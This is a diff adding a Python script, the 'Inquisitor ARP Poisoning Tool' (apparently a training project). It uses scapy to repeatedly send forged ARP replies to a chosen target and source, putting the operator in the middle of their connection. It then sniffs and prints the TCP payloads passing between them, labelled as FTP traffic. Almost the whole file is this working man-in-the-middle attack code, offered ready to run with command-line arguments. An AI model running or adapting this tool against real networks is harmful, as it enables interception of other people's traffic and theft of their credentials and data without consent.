@@ -1,0 +1,98 @@
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+
+import argparse
+import re
+import sys
+import threading
+import time
+from scapy.all import ARP, Ether, send, sniff
+
+SRC_IP = None
+TARGET_IP = None
+SRC_MAC = None
+TARGET_MAC = None
+RUNNING = True
+DELAY = 2
+INTERFACE = "eth0"
+
+def is_valid_ip(ip):
+    # Regex pour valider une adresse IPv4
+    pattern = r"^(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$"
+    return re.match(pattern, ip) is not None
+
+def is_valid_mac(mac):
+    # Regex pour valider une adresse MAC
+    pattern = r"^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$"
+    return re.match(pattern, mac) is not None
+
+def valid_args(args):
+    
+    SRC_IP = args.src_ip if is_valid_ip(args.src_ip) else None
+    SRC_MAC = args.src_mac if is_valid_mac(args.src_mac) else None
+    TARGET_IP = args.target_ip if is_valid_ip(args.target_ip) else None
+    TARGET_MAC = args.target_mac if is_valid_mac(args.target_mac) else None
+    return SRC_IP, SRC_MAC, TARGET_IP,TARGET_MAC
+
+def packet_parser(packet):
+    if packet.haslayer("TCP") and packet["TCP"].payload:
+            raw_data = packet["TCP"].payload.load.decode(errors='replace')
+            print(f"FTP Traffic from {SRC_IP} to {TARGET_IP}: {raw_data.strip()}")
+
+def sniff_ftp_packets():
+
+    print(f"Listening for FTP packets in {INTERFACE}...")
+    while RUNNING:
+        if INTERFACE:
+            sniff(prn=packet_parser, timeout=2, store=0, iface=INTERFACE)
+        else:
+            print("Unable to determine bridge interface name.")
+            break
+
+def restore_arp():
+    packet_target = ARP(op=2, pdst=TARGET_IP, hwdst=TARGET_MAC, psrc=SRC_IP, hwsrc=SRC_MAC)
+    send(packet_target, verbose=0)
+    print(f"Restauration de l'ARP pour la cible {TARGET_IP}.")
+
+    packet_source = ARP(op=2, pdst=SRC_IP, hwdst=SRC_MAC, psrc=TARGET_IP, hwsrc=TARGET_MAC)
+    send(packet_source, verbose=0)
+    print(f"Restauration de l'ARP pour la source {SRC_IP}.")
+
+def main_loop():
+
+    while RUNNING:
+        try:
+            arp_response_target = ARP(pdst=TARGET_IP, hwdst=TARGET_MAC, psrc=SRC_IP, op='is-at')
+            arp_response_gateway = ARP(pdst=SRC_IP, hwdst=SRC_MAC, psrc=TARGET_IP, op='is-at')
+            send(arp_response_target, verbose=0)
+            send(arp_response_gateway, verbose=0)
+            time.sleep(DELAY)
+        except Exception as e:
+            print(f"Error in ARP poison thread: {e}")
+    
+
+if __name__ == "__main__":
+    parser = argparse.ArgumentParser(description="Inquisitor ARP Poisoning Tool")
+
+    parser.add_argument("--src-ip", required=True, help="Source IP address")
+    parser.add_argument("--src-mac", required=True, help="Source MAC address")
+    parser.add_argument("--target-ip", required=True, help="Target IP address")
+    parser.add_argument("--target-mac", required=True, help="Target MAC address")
+
+    args = parser.parse_args()
+    SRC_IP, SRC_MAC, TARGET_IP, TARGET_MAC = valid_args(args)
+    if any(var is None for var in [SRC_IP, SRC_MAC, TARGET_IP, TARGET_MAC]):
+        print("Invalid arguments")
+        sys.exit(1)
+
+    thread = threading.Thread(target=main_loop)
+    thread.start()
+
+    try:
+        sniff_ftp_packets()
+    except KeyboardInterrupt:
+        print("\nCTRL+C detected. Restoring ARP tables...")
+
+    restore_arp()
+    RUNNING = False
+    thread.join()   #waiting thread finish
